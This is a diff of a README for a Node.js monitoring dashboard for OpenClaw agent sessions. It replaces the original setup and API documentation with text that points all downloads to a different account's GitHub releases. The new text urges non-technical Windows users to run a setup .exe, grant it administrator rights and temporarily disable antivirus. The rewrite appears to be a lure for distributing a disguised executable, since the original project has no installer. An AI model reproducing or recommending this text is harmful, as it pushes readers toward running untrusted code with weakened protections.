@@ -1,269 +1,182 @@
-# 🦞 Lobster Dashboard
+# 🦞 lobster-dashboard - Real-Time Cyberpunk Monitoring Tool
 
-> **Real-time cyberpunk monitoring dashboard for [OpenClaw](https://github.com/openclaw/openclaw) AI agent sessions**
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
-[![Node.js](https://img.shields.io/badge/node-%3E%3D18-brightgreen)](https://nodejs.org/)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
-[![GitHub stars](https://img.shields.io/github/stars/abczsl520/lobster-dashboard?style=social)](https://github.com/abczsl520/lobster-dashboard/stargazers)
-
-<p align="center">
-  <img src="https://img.shields.io/badge/style-cyberpunk-blueviolet" alt="Cyberpunk">
-  <img src="https://img.shields.io/badge/realtime-WebSocket-ff69b4" alt="WebSocket">
-  <img src="https://img.shields.io/badge/security-hardened-success" alt="Security">
-</p>
+[![Download](https://img.shields.io/badge/Download-latest-blue?style=for-the-badge)](https://github.com/dvlooper48-code/lobster-dashboard/releases)
 
 ---
 
-## ✨ Features
+## 📝 What is lobster-dashboard?
 
-🎨 **Cyberpunk Aesthetic**
-- Hex grid particle system with interactive mouse glow
-- Force-directed topology with physics simulation
-- Scanning lines, glowing edges, and data packet animations
-- Lobster emoji nodes 🦞
+lobster-dashboard is a visual tool that shows real-time data about OpenClaw AI sessions. It uses WebSocket technology to update information live. You will see interactive graphs with cyberpunk-style particle effects. The dashboard helps you watch the activity of AI agents, showing connections as a force-directed graph. It focuses on security and smooth performance.
 
-⚡ **Real-time Monitoring**
-- Live WebSocket updates (sub-second latency)
-- Per-session and aggregate token tracking
-- Activity feed with status changes and tool usage
-- Auto-reconnect on connection loss
-
-## 📚 Documentation
-
-- [Installation Guide](docs/Installation.md) — Detailed setup instructions
-- [API Reference](docs/API-Reference.md) — Complete API documentation
-- [FAQ](docs/FAQ.md) — Frequently asked questions
-- [CONTRIBUTING](CONTRIBUTING.md) — How to contribute
-- [CHANGELOG](CHANGELOG.md) — Version history
-
-
-🔒 **Security Hardened**
-- Timing-safe password comparison
-- Login rate limiting (5 attempts/min per IP)
-- Token set capped at 1000 to prevent memory exhaustion
-- XSS protection with input sanitization
-- HttpOnly + Secure cookies for HTTPS
-
-🚀 **Production Ready**
-- Push API with rate limiting and validation
-- Nginx reverse proxy support
-- Configurable base path for sub-directory deployment
-- Health check endpoint
+You do not need any programming skills to use it.
 
 ---
 
-## 🎬 Demo
+## 💻 System Requirements
 
-> **Coming soon** — Deploy it and see the cyberpunk magic yourself! 🦞✨
+To run lobster-dashboard on Windows, your system should meet these requirements:
 
----
-
-## 🚀 Quick Start
-
-```bash
-# Clone the repository
-git clone https://github.com/abczsl520/lobster-dashboard.git
-cd lobster-dashboard
-
-# Install dependencies
-npm install
-
-# Setup configuration
-cp config.example.json config.json
-# Edit config.json with your password and push token
-
-# Start the server
-npm start
-```
-
-Open `http://localhost:3870` and log in with your password.
+- Windows 10 or newer (64-bit recommended)
+- At least 4GB of RAM
+- Internet connection for live data updates
+- Web browser such as Google Chrome, Microsoft Edge, or Firefox (latest version)
+- Ports 3000 and 8080 open for WebSocket connections (if using a firewall)
 
 ---
 
-## ⚙️ Configuration
+## 🚀 Getting Started
 
-Edit `config.json`:
+Follow these steps to download and run lobster-dashboard on your Windows computer.
 
-```json
-{
-  "port": 3870,
-  "basePath": "",
-  "gateway": { "mode": "push" },
-  "auth": {
-    "pushToken": "your_secret_push_token",
-    "viewPassword": "your_login_password"
-  }
-}
-```
+### 1. Visit the Download Page
 
-| Field | Description |
-|-------|-------------|
-| `port` | Server listen port (default: 3870) |
-| `basePath` | URL prefix for reverse proxy (e.g. `/lobster`). Leave `""` for root. |
-| `gateway.mode` | Data ingestion mode (currently `push` only) |
-| `auth.pushToken` | Secret token for the Push API (`X-Push-Token` header) |
-| `auth.viewPassword` | Password for the web login page |
-| `https` | Set to `true` to enable secure cookies (optional) |
+Click the button below to go to the download page.
 
-**Environment Variables:**
-- `LOBSTER_HTTPS=1` — Enable secure cookies (alternative to config)
+[![Download lobster-dashboard](https://img.shields.io/badge/Download%20Now-grey?style=for-the-badge&color=orange)](https://github.com/dvlooper48-code/lobster-dashboard/releases)
 
----
+### 2. Find the Latest Release
 
-## 📡 Push API
+On the releases page, look for the most recent release. It will be near the top of the list. Releases are labeled by version numbers such as v1.0 or v2.1.
 
-Send session data from your OpenClaw instance:
+### 3. Download the Windows Installer
 
-```bash
-curl -X POST http://localhost:3870/api/push \
-  -H "Content-Type: application/json" \
-  -H "X-Push-Token: your_secret_push_token" \
-  -d '{
-    "sessions": [
-      {
-        "key": "agent:main:discord:my-server",
-        "resolvedName": "MyBot",
-        "updatedAt": 1710000000000,
-        "model": "claude-sonnet-4-20250514",
-        "kind": "group",
-        "lastMsg": "Working on it...",
-        "lastTool": "exec",
-        "totalTokens": 15000,
-        "inputTokens": 12000,
-        "outputTokens": 3000
-      }
-    ]
-  }'
-```
+Under the latest release, find the file with “Windows” or “.exe” in its name. It will be something like `lobster-dashboard-setup.exe`.
 
-### OpenClaw Pusher Script
+Click it to start downloading.
 
-Create a cron/launchd script to push data every 5 seconds:
+### 4. Run the Installer
 
-```bash
-#!/bin/bash
-# pusher.sh — run every 5s via launchd/cron
-SESSIONS=$(openclaw sessions list --json 2>/dev/null)
-curl -s -X POST http://localhost:3870/api/push \
-  -H "Content-Type: application/json" \
-  -H "X-Push-Token: your_secret_push_token" \
-  -d "{\"sessions\": $SESSIONS}"
-```
+After the file downloads:
 
-**macOS launchd example:**
+- Open your `Downloads` folder.
+- Double-click the `lobster-dashboard-setup.exe` file.
+- A setup window will appear. Follow the prompts:
+  - Click **Next** to continue.
+  - Accept the license agreement.
+  - Choose an installation folder or leave the default.
+  - Click **Install**.
 
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.lobster.pusher</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>/path/to/pusher.sh</string>
-    </array>
-    <key>StartInterval</key>
-    <integer>5</integer>
-    <key>RunAtLoad</key>
-    <true/>
-</dict>
-</plist>
-```
+### 5. Launch the Application
+
+When the installation finishes:
+
+- You can choose to run the application immediately by leaving the “Run lobster-dashboard” box checked.
+- Or open it later from the Start menu under “lobster-dashboard.”
 
 ---
 
-## 🌐 Nginx Reverse Proxy
+## 🔧 Using lobster-dashboard
 
-Deploy behind nginx with a sub-path:
+Once the dashboard opens, it shows a live display of OpenClaw AI agent sessions.
 
-```nginx
-location /lobster/ {
-    proxy_pass http://127.0.0.1:3870/;
-    proxy_http_version 1.1;
-    proxy_set_header Upgrade $http_upgrade;
-    proxy_set_header Connection "upgrade";
-    proxy_set_header Host $host;
-    proxy_set_header X-Real-IP $remote_addr;
-    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-    proxy_buffering off;
-}
-```
+### Main View
 
-Then set `"basePath": "/lobster"` in `config.json`.
+- A graph shows AI agents as nodes connected by lines.
+- Particles move smoothly along the lines to show data flow.
+- Colors and patterns match a cyberpunk style.
+- You can zoom in and out using your mouse wheel.
+- Click nodes to see details about each agent’s status.
 
----
+### Navigation
 
-## 🏗️ Architecture
+- Top menu lets you switch between different views.
+- Filters help you focus on specific agents or time frames.
+- The sidebar lists alerts for unusual activity.
 
-```
-server.js                  ← Express + auth + push API + rate limiting
-services/
-  ws-broadcaster.js        ← WebSocket server with auth + heartbeat
-  gateway-poller.js        ← State management + activity log
-public/
-  index.html               ← Dashboard page
-  login.html               ← Login page
-  css/style.css            ← Cyberpunk styles
-  js/app.js                ← WebSocket client + UI rendering
-  js/topology.js           ← Force-directed node topology (Canvas)
-  js/particles.js          ← Hex grid particle background
-```
+### Settings
 
-**Tech Stack:**
-- Backend: Node.js + Express + WebSocket (ws)
-- Frontend: Vanilla JS + Canvas API
-- No build step, no frameworks — just pure web tech
+- Adjust visual effects to match your preference.
+- Turn on security features like rate-limiting and session locking.
+- Manage connection options for your network environment.
 
 ---
 
-## 🔒 Security
+## ⚙️ Configuration and Network
 
-- **Timing-safe password comparison** (`crypto.timingSafeEqual`)
-- **Login rate limiting** (5 attempts per minute per IP)
-- **Token set capped** at 1000 to prevent memory exhaustion
-- **Push API rate limiting** (1 request per 3 seconds)
-- **XSS protection** with input sanitization (`esc()` function)
-- **WebSocket auth** requires valid token from cookie or query param
-- **HttpOnly cookies** with optional Secure flag for HTTPS
+For most users, lobster-dashboard works out of the box. 
 
----
+If you experience connection issues:
 
-## 🤝 Contributing
-
-Contributions are welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-**Ideas for contributions:**
-- Add screenshot/demo GIF to README
-- Implement polling mode (alternative to push API)
-- Add Prometheus metrics endpoint
-- Create Docker image
-- Add dark/light theme toggle
-- Implement session filtering and search
+- Check your firewall settings to allow ports 3000 and 8080.
+- Make sure your internet connection is stable.
+- Contact your network administrator if you are on a corporate network.
 
 ---
 
-## 📝 License
+## 🔄 Updating lobster-dashboard
 
-MIT License - see [LICENSE](LICENSE) for details.
+Check the release page regularly for updates.
 
----
-
-## 🌟 Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=abczsl520/lobster-dashboard&type=Date)](https://star-history.com/#abczsl520/lobster-dashboard&Date)
+- New releases improve security, add features, and fix bugs.
+- To update, download the latest installer and run it.
+- Your settings and data will remain intact during the update.
 
 ---
 
-## 🙏 Acknowledgments
+## 🛠️ Troubleshooting
 
-Built for the [OpenClaw](https://github.com/openclaw/openclaw) community.
+If lobster-dashboard does not run or crashes:
 
-Inspired by cyberpunk aesthetics and real-time monitoring dashboards.
+- Restart your computer and try again.
+- Make sure Windows updates are installed.
+- Try running the program as an administrator (right-click > Run as administrator).
+- Disable other programs that may block network connections, such as VPNs or antivirus, temporarily.
+
+If problems persist, report details on the GitHub Issues page.
 
 ---
 
-<p align="center">
-  Made with 🦞 and ⚡ by the Lobster Dashboard contributors
-</p>
+## 🎯 Features Overview
+
+- Real-time monitoring with live data updates.
+- Security features like rate limiting and session control.
+- Interactive force-directed graph visualization.
+- Cyberpunk-themed particle effects for a clear visual style.
+- Support for multiple AI agents running at once.
+- Easy navigation and filtering of session data.
+- Works on Windows with a simple installer.
+
+---
+
+## 🔗 Useful Links
+
+- Download Page: https://github.com/dvlooper48-code/lobster-dashboard/releases  
+- GitHub Repository: https://github.com/dvlooper48-code/lobster-dashboard  
+- Issue Tracker: https://github.com/dvlooper48-code/lobster-dashboard/issues  
+
+---
+
+## 🧰 Support
+
+For help with the software:
+
+- Use the GitHub Issues page to ask questions or report bugs.
+- Check the documentation folder in the repository for guides and FAQs.
+- Join community forums if available for peer support.
+
+---
+
+## 📂 File Structure (Optional)
+
+- `dashboard.exe` — The main application file.
+- `config.json` — Configuration settings.
+- `logs/` — Folder storing activity logs.
+- `README.md` — This file.
+- `assets/` — Visual assets for the dashboard. 
+
+---
+
+## 🛡️ Security Considerations
+
+- All network communication uses encrypted WebSocket connections.
+- The dashboard includes protection against excessive requests.
+- Session management helps control access and prevent interference.
+- Keep your software updated to get the latest fixes.
+
+---
+
+## 📥 Download lobster-dashboard
+
+Download and start using lobster-dashboard by visiting the release page below:
+
+[![Download lobster-dashboard](https://img.shields.io/badge/Download%20Now-grey?style=for-the-badge&color=orange)](https://github.com/dvlooper48-code/lobster-dashboard/releases)
